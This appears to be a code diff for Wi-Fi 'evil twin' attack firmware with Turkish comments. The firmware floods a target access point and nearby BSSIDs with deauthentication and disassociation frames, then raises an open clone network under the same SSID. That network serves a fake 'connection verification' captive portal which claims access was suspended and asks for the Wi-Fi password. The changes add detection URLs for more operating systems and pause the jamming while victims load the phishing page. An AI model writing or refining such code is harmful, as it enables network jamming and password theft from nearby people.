@@ -265,7 +265,13 @@ int32_t target_channel = 6;
 uint8_t target_enc = ENC_TYPE_CCMP;
 
 volatile bool deauth_active = false;
-int32_t ap_running_channel = -1;
+volatile bool portal_busy   = false;
+int32_t ap_running_channel  = -1;
+unsigned long last_netif_check_ms = 0;
+#define NETIF_CHECK_INTERVAL_MS 5000UL
+
+unsigned long last_client_connect_ms = 0;
+#define CLIENT_GRACE_MS 5000UL
 
 WiFiServer server(SERVER_PORT); 
 DNSServer  dnsServer;
@@ -449,11 +455,6 @@ void deauthTask(void *param) {
   };
   
   int common_5g_channels[] = {36, 40, 44, 48, 149};
-  
-  // Tüm 2.4GHz kanalları — her döngüde 3'erli grup döner, zaman içinde hepsi taranır
-  int common_24g_channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
-  const int total_24g = 13;
-  static int ch24_rotate_idx = 0;
 
   Serial.println("\n[Deauth] Anti-Kacis ve Dinamik AP Takibi Aktif!");
 
@@ -488,11 +489,20 @@ void deauthTask(void *param) {
         vTaskDelay(pdMS_TO_TICKS(1)); 
     }
     
+    // Portal meşgulse VEYA yeni bağlantı grace süresi dolmadıysa
+    // kanala geri dön ve bekle — captive portal tespiti + HTTP trafiği kesilmesin
+    wifi_set_channel(target_channel);
+    if (portal_busy || (millis() - last_client_connect_ms < CLIENT_GRACE_MS)) {
+        vTaskDelay(pdMS_TO_TICKS(200));
+        continue;
+    }
+
     // Ağın Çökmemesi İçin Nefes Alma (150ms)
     vTaskDelay(pdMS_TO_TICKS(150)); 
 
     // === 2. 5GHz KANALLARINA BASKIN ===
     for(int c=0; c < 5; c++) {
+        if (portal_busy) break;
         wifi_set_channel(common_5g_channels[c]);
         for (int offset = -2; offset <= 2; offset++) {
             uint8_t temp_bssid[6];
@@ -510,30 +520,8 @@ void deauthTask(void *param) {
             vTaskDelay(pdMS_TO_TICKS(1)); 
         }
     }
-    
-    // === 3. 2.4GHz DÖNEN KANAL TARAMASI (Her döngüde 3 farklı kanal, 13'ü sırayla gezer) ===
-    for (int i = 0; i < 3; i++) {
-        int ch = common_24g_channels[(ch24_rotate_idx + i) % total_24g];
-        if (ch == target_channel) continue;
-
-        wifi_set_channel(ch);
-        for (int offset = -2; offset <= 2; offset++) {
-            uint8_t temp_bssid[6];
-            memcpy(temp_bssid, target_bssid, 6);
-            temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
-            memcpy(&frame_template[10], temp_bssid, 6);
-            memcpy(&frame_template[16], temp_bssid, 6);
-
-            frame_template[0] = 0xC0; frame_template[24] = 0x07;
-            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-            frame_template[24] = 0x02;
-            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-            frame_template[0] = 0xA0; frame_template[24] = 0x08;
-            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-            vTaskDelay(pdMS_TO_TICKS(1));
-        }
-    }
-    ch24_rotate_idx = (ch24_rotate_idx + 3) % total_24g;
+    // 5GHz sonrası mutlaka target_channel'a geri dön
+    wifi_set_channel(target_channel);
   }
   vTaskDelete(NULL);
 }
@@ -676,33 +664,44 @@ void sendPortalPage(WiFiClient &client, bool show_result) {
   client.print("<h1>Bağlantı Doğrulaması</h1>");
   client.print("<p class='sub'>Güvenlik standartları güncellendiği için ağ erişiminiz geçici olarak askıya alınmıştır. İnternete tekrar bağlanabilmek için lütfen mevcut şifrenizi doğrulayınız.</p>");
 
+  // Animasyon kutusu — form'un üstünde, doğru konumda
+  // Sunucu CS_RUNNING ise direkt göster; değilse gizli başlat, JS butona basınca açar
   if (conn_status == CS_RUNNING) {
-      client.print("<div class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
+      client.print("<div id='sbox' class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
   } else if (show_result) {
     if (conn_result == "ok") client.print("<div class='status-box ok'>&#10003; Doğrulama başarılı. İnternet erişiminiz sağlanıyor...</div>");
     else if (conn_result == "fail") client.print("<div class='status-box err'>&#10007; Girdiğiniz Wi-Fi şifresi hatalı. Lütfen tekrar deneyiniz.</div>");
+  } else {
+    client.print("<div id='sbox' style='display:none;' class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
   }
 
   client.print("<div class='conn-status'>Erişim Sağlanacak Ağ:<br><b style='font-size:1.3rem; display:block; margin-top:8px; color:#0056b3;'>"); 
   client.print(target_ssid);
   client.print("</b></div>");
   
-  client.print("<form method='POST' action='/connect'><div class='pass-wrap'><label for='pass'>Wi-Fi Parolası</label>");
+  client.print("<form method='POST' action='/connect' id='cf' onsubmit='handleSubmit()'>");
+  client.print("<div class='pass-wrap'><label for='pass'>Wi-Fi Parolası</label>");
   client.print("<input type='password' id='pass' name='pass' placeholder='Mevcut şifrenizi giriniz...' autocomplete='off' required>");
   client.print("<div class='show-pass' onclick=\"var p=document.getElementById('pass');p.type=p.type=='password'?'text':'password'\">&#128065; Şifreyi Göster</div></div>");
-  client.print("<button type='submit'>İnternete Bağlan</button></form>");
-  
+  client.print("<button type='submit' id='sbtn'>İnternete Bağlan</button></form>");
+
+  client.print("<script>");
+  client.print("function handleSubmit(){");
+  client.print("  var box=document.getElementById('sbox');");
+  client.print("  var btn=document.getElementById('sbtn');");
+  client.print("  if(box){ box.style.display='block'; }");
+  client.print("  if(btn){ btn.disabled=true; btn.style.opacity='0.6'; }");
+  client.print("}");
   if (conn_status == CS_RUNNING) {
-      client.print("<script>");
-      client.print("function tryR() {");
-      client.print("  var t = new Date().getTime();");
-      client.print("  fetch('/?t=' + t, {cache: 'no-store', signal: AbortSignal.timeout(4000)})");
-      client.print("    .then(function(r) { if(r.ok) { window.location.href = '/?t=' + t; } else { setTimeout(tryR, 2000); } })");
-      client.print("    .catch(function() { setTimeout(tryR, 2000); });");
+      client.print("function tryR(){");
+      client.print("  var t=new Date().getTime();");
+      client.print("  fetch('/?t='+t,{cache:'no-store',signal:AbortSignal.timeout(4000)})");
+      client.print("    .then(function(r){if(r.ok){window.location.href='/?t='+t;}else{setTimeout(tryR,2000);}})");
+      client.print("    .catch(function(){setTimeout(tryR,2000);});");
       client.print("}");
-      client.print("setTimeout(tryR, 3000);");
-      client.print("</script>");
+      client.print("setTimeout(tryR,3000);");
   }
+  client.print("</script>");
   
   client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy; 2026</div></div></body></html>");
 }
@@ -747,7 +746,16 @@ void handleClient(WiFiClient &client) {
     if (hostHeader.indexOf(':') != -1) hostHeader = hostHeader.substring(0, hostHeader.indexOf(':'));
   }
 
-  bool path_is_captive = path.indexOf("hotspot-detect") != -1 || path.indexOf("generate_204") != -1 || path.indexOf("redirect") != -1;
+  // iOS, Android, Windows, Samsung captive portal tespit URL'leri
+  bool path_is_captive = path.indexOf("hotspot-detect") != -1
+                      || path.indexOf("generate_204")   != -1
+                      || path.indexOf("redirect")       != -1
+                      || path.indexOf("connecttest")    != -1
+                      || path.indexOf("ncsi")           != -1
+                      || path.indexOf("canonical")      != -1
+                      || path.indexOf("success")        != -1
+                      || path.indexOf("mobile/status")  != -1
+                      || path.indexOf("library/test")   != -1;
   bool host_is_foreign = (hostHeader.length() > 0 && hostHeader != AP_IP_ADDR);
 
   if (path_is_captive || host_is_foreign) {
@@ -919,8 +927,7 @@ void loop() {
     deauth_active = false;
     delay(300);
     dnsServer.stop();
-    wifi_set_mode(RTW_MODE_STA_AP);
-    delay(500);
+    // Mod değişikliğine gerek yok — zaten RTW_MODE_STA_AP modundayız
     wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
     delay(1000);
     netif_set_up(&xnetif[1]);
@@ -983,12 +990,28 @@ void loop() {
     startScan();
   }
 
+  // === NETİF KEEPALIVE: AP arayüzü düşerse 5 saniyede bir yeniden ayağa kaldır ===
+  if (ap_switched && (millis() - last_netif_check_ms > NETIF_CHECK_INTERVAL_MS)) {
+    last_netif_check_ms = millis();
+    if (!netif_is_up(&xnetif[1]) || !netif_is_link_up(&xnetif[1])) {
+      Serial.println("[Keepalive] netif düşmüş, yeniden başlatılıyor...");
+      netif_set_up(&xnetif[1]);
+      netif_set_link_up(&xnetif[1]);
+      dhcps_init(&xnetif[1]);
+    }
+    // Kanal kayması önlemi: radyoyu her zaman target_channel'a sabitle
+    wifi_set_channel(target_channel);
+  }
+
   WiFiClient client = server.available();
-  if (client) { 
+  if (client) {
+    last_client_connect_ms = millis();
+    portal_busy = true;
     handleClient(client); 
     client.flush();
     delay(50); 
-    client.stop(); 
+    client.stop();
+    portal_busy = false;
   }
   
   delay(2); 
